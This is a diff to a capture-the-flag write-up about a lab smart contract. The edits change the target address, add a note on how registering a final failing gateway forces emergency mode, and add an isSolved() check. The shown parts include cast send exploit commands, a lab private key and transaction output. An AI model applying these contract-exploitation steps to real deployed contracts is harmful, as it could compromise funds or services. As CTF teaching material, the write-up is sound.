@@ -40,7 +40,7 @@ Select action (enter number): 1
 
 Player Private Key : 0xaf9b6a6b6a16d5b22660b2fdc6ac0e2e497fcbda8442d842e83c27eb6d33f652
 Player Address     : 0xA28BFc8F560755EAE77bddeD4e27d70C865330cb
-Target contract    : 0xa97b6577c23a23aB2d9613B8F2a27597E457aC06
+Target contract    : 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925
 Setup contract     : 0x27B7283221678D840Fb11bE17278dA18BEE3B109
 ```
 
@@ -121,6 +121,7 @@ function infrastructureSanityCheck() external circuitBreaker failSafeMonitor {
 }
 
 ```
+
 Ultimately, this is when we uncovered critical vulnerabvilities in the logic. These checks are not robust enough to handle edge cases. Let’s explain each of these vulnerabilities one-by-one.
 
 ## Vulnerability #1: Stuck State Management Vulnerability
@@ -254,6 +255,9 @@ cast send $TARGET "infrastructureSanityCheck()" --private-key $PRIVATE_KEY --rpc
 cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
 ```
 
+***Note:***  
+Here we don’t need to call `infrastructureSanityCheck()` again because the system **already triggers emergency mode** automatically once the health percentage falls below 50%. Subsequent `registerGateway()` calls already recalculate the health status internally. This means that by registering the final failing gateway, we instantly force the system to enter emergency mode.
+
 Ultimately, at this point, we can conclude that the emergency mode is triggered and the system is compromised. Once we are done, we can query the isSolved function or rush to the channel UI.
 
 ```bash
@@ -273,7 +277,7 @@ This highlights a broader lesson: in blockchain security, even tiny logic flaws 
 
 
 <details>
-<summary>Exploit Command Outputs</summary>
+<summary>Exploit Command Output</summary>
 
 ```bash
 ### 1. Increase Quota to gatewayID 0
@@ -342,6 +346,10 @@ logsBloom            0x00000000<SNIP>000002000
 status               1 (success)
 transactionHash      0xbea0f0d473762651b14a0484dae9e6724f2013a3df913d18c340a43799a8f635
 
+### Step 7: Verify Solution
+└─$ cast call 0x27B7283221678D840Fb11bE17278dA18BEE3B109 "isSolved()" --rpc-url http://94.237.59.38:42525
+Result:
+0x0000000000000000000000000000000000000000000000000000000000000001
 ```
 </details>
 
